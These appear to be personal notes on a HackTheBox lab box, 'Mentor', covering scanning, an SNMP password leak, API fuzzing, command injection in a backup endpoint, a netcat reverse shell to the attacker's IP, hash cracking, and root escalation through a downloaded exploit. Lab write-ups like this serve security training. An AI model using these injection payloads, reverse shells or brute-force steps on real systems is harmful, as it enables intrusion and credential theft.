
### Initial access
Nmap
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.

```
FFUZ
But it dont have any dir
We scan subdomain and see api domain 
```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ ffuf -u http://10.129.228.102 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1  -t 50 -mc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.102
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mentorquotes.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 404
 :: Filter           : Response size: 1
________________________________________________

api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 362ms]
:: Progress: [4989/4989] :: Job [1/1] :: 209 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
                                                                                              
```

```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://api.mentorquotes.htb/FUZZ -mc 200,301,302,401,403


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,401,403
________________________________________________

docs                    [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 129ms]
server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 178ms]
:: Progress: [4750/4750] :: Job [1/1] :: 197 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

```

Udpx
```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ udpx -t 10.129.228.102   

        __  ______  ____ _  __                                                                                                                                                               
       / / / / __ \/ __ \ |/ /                                                                                                                                                               
      / / / / / / / /_/ /   /                                                                                                                                                                
     / /_/ / /_/ / ____/   |                                                                                                                                                                 
     \____/_____/_/   /_/|_|                                                                                                                                                                 
         v1.0.7, by @nullt3r                                                                                                                                                                 
                                                                                                                                                                                             
2026/09/10 08:43:12 [+] Starting UDP scan on 1 target(s)                                                                                                                                     
2026/09/10 08:43:19 [*] 10.129.228.102:161 (snmp)
2026/09/10 08:43:32 [+] Scan completed
```

SNMP Recon
```
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: RFC1213-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (16) 0:00:00.16
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (16) 0:00:00.16

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ wget https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/master/snmpbrute.py

--2026-09-10 09:58:30--  https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/master/snmpbrute.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28029 (27K) [text/plain]
Saving to: ‘snmpbrute.py’

snmpbrute.py                                    100%[====================================================================================================>]  27.37K  --.-KB/s    in 0.01s   

2026-09-10 09:58:31 (2.32 MB/s) - ‘snmpbrute.py’ saved [28029/28029]



```

After read docs api we have this form
```
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "test@example.com",
  "username": "test123",
  "password": "test123456789"
}'
```

Let ffuz find password admin
```
ffuf -w /usr/share/wordlists/rockyou.txt \
     -u http://api.mentorquotes.htb/auth/login \
     -X POST \
     -H "accept: application/json" \
     -H "Content-Type: application/json" \
     -d '{"email": "admin@mentorquotes.htb", "username": "admin", "password": "FUZZ"}' \
     -fc 401,403

```

Recon internal snmp
```bash {26}
HOST-RESOURCES-MIB::hrSWRunParameters.1197 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f"
HOST-RESOURCES-MIB::hrSWRunParameters.1204 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1220 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1239 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1253 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1318 = STRING: "-H fd:// --containerd=/run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1670 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.1739 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
HOST-RESOURCES-MIB::hrSWRunParameters.1753 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1773 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1853 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1870 = STRING: "-namespace moby -id 3414a3539647871715c98faf4eb2ad4c92a68e0a9d8ee081f62a113e668c9825 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1893 = STRING: "-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1902 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1903 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1904 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1905 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1906 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1907 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1959 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"
HOST-RESOURCES-MIB::hrSWRunParameters.1976 = STRING: "-namespace moby -id 8a07c9d5ddaffae4d6522526c5b2836a7f7d7b6c9599677eed0a614b5d0ba8aa -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.2008 = STRING: "main.py"
HOST-RESOURCES-MIB::hrSWRunParameters.2026 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"
HOST-RESOURCES-MIB::hrSWRunParameters.2027 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"
HOST-RESOURCES-MIB::hrSWRunParameters.2096 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.2109 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
HOST-RESOURCES-MIB::hrSWRunParameters.2157 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.287140 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.287141 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.313001 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.318448 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.321982 = ""

```

![[Assets/Pasted image 20260910213357.png]]
 We have cred `james:kj23sadkj123as0-d213`

Test login
```
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}'
```


```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" 
```
We ffuz finding hidden api
```bash
ffuf -u http://api.mentorquotes.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt 
admin                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 130ms]
admin                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 170ms]
auth/login              [Status: 405, Size: 31, Words: 3, Lines: 1, Duration: 181ms]
docs/                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 253ms]
docs                    [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 253ms]
users/current           [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 364ms]
users/login             [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 364ms]
docs                    [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 771ms]

```

```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ curl -s http://api.mentorquotes.htb/admin/ \
  -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" | jq .
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}

┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ curl -s http://api.mentorquotes.htb/admin/backup \
  -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" | jq .
{
  "detail": "Method Not Allowed"
}
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ curl -s -X POST http://api.mentorquotes.htb/admin/backup \
  -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" | jq .
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

   
```

Brute force post field 
```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -X POST \
  -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" \
  -H "Content-Type: application/json" \
  -d '{"FUZZ":"test"}' \
  -u http://api.mentorquotes.htb/admin/backup \
  -fr "field required" \
  -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://api.mentorquotes.htb/admin/backup
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
 :: Header           : Content-Type: application/json
 :: Data             : {"FUZZ":"test"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: field required
________________________________________________

path                    [Status: 200, Size: 16, Words: 1, Lines: 1, Duration: 126ms]
:: Progress: [6453/6453] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
                                                                                             
```
because back up it will have cp "VAR" /backup which we can inject using `;CMD;`
Let test
```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ time curl -s -X POST http://api.mentorquotes.htb/admin/backup \
  -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" \
  -H "Content-Type: application/json" \
  -d '{"path": ".;sleep 5 ;"}' | jq .
{
  "INFO": "Done!"
}

real    6.85s
user    0.00s
sys     0.00s
cpu     0%

real    6.85s
user    0.00s
sys     0.00s
cpu     0%

```

Let get shell
```
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ time curl -s -X POST http://api.mentorquotes.htb/admin/backup \
  -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" \
  -H "Content-Type: application/json" \
  -d '{"path": ".;nc 10.10.17.47 4444 -e /bin/sh;"}' | jq .


```


This just docker shell
```bash
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ penelope --oscp-safe --no-log -p 4444

[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => 3414a3539647 10.129.228.102 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/local/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/app # bash
/bin/sh: bash: not found
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # cd  /root

```


### Lateral Movement
run linpeas
```bash 
╔══════════╣ Users with console (T1087.001)
Terminated                                                                                                                                              
ICMP is not accessible
postgres:x:70:70::/var/lib/postgresql:/bin/sh
root:x:0:0:root:/root:/bin/ash


╔══════════╣ Interfaces (T1016)
eth0      Link encap:Ethernet  HWaddr 02:42:AC:16:00:03                                                                                                      
          inet addr:172.22.0.3  Bcast:172.22.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:699812 errors:0 dropped:0 overruns:0 frame:0
          TX packets:611558 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:182675366 (174.2 MiB)  TX bytes:149754076 (142.8 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:8 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:548 (548.0 B)  TX bytes:548 (548.0 B)
ADMIN_EMAIL=james@mentorquotes.htb
LANG=C.UTF-8
SECRET=76dsf761g31276hjgsdkahuyt123
SHELL=/bin/sh


```
After reading source code of app and `db.py` we have this to connect to database
```bash
/app/app # python3 -c "
> import psycopg2
> conn = psycopg2.connect('postgresql://postgres:postgres@172.22.0.1/mentorquotes_db')
> cur = conn.cursor()
> cur.execute('SELECT id, email, username, password FROM users;')
> for row in cur.fetchall():
>     print(row)
> "
(1, 'james@mentorquotes.htb', 'james', '7ccdcd8c05b59add9c198d492b36a503')
(2, 'svc@mentorquotes.htb', 'service_acc', '53f22d0dfa10dce7e29cd31f4f953fd8')
(4, 'test@example.com', 'test123', '74ce9d249b616f0a6d514d429d725b4e')
(5, 'user@example.com', 'string', 'a5f726cd35b69e3b46ec92868cf944d2')

```
Crack svc hash
```bash
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
123meunomeeivani (?)     
1g 0:00:00:00 DONE (2026-09-10 12:12) 2.173g/s 28966Kp/s 28966Kc/s 28966KC/s 123miguel..123lockout123
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Cred `svc:123meunomeeivani`
```bash
┌──(kali㉿kali)-[~/HTB/Mentor]
└─$ ssh svc@10.129.228.102
svc@10.129.228.102's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 10 04:11:55 PM UTC 2026

  System load:                      0.0859375
  Usage of /:                       66.8% of 8.09GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        331
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.102
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:4084

  => There are 90 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```
### Priv escalation

Copy fail
```
svc@mentor:~$ wget -O exp.py http://10.10.17.47/copy_fail.py
--2026-09-10 16:27:31--  http://10.10.17.47/copy_fail.py
Connecting to 10.10.17.47:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1684 (1.6K) [text/x-python]
Saving to: ‘exp.py’

exp.py                                  100%[============================================================================>]   1.64K  --.-KB/s    in 0.08s   

2026-09-10 16:27:32 (21.1 KB/s) - ‘exp.py’ saved [1684/1684]

svc@mentor:~$ python3 exp.py
# id
uid=0(root) gid=1001(svc) groups=1001(svc)
# 

```
Alternative run linpes
```
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                                
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
createUser bootstrap MD5 SuperSecurePassword123__ DES

james@mentor:/home/svc$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh


```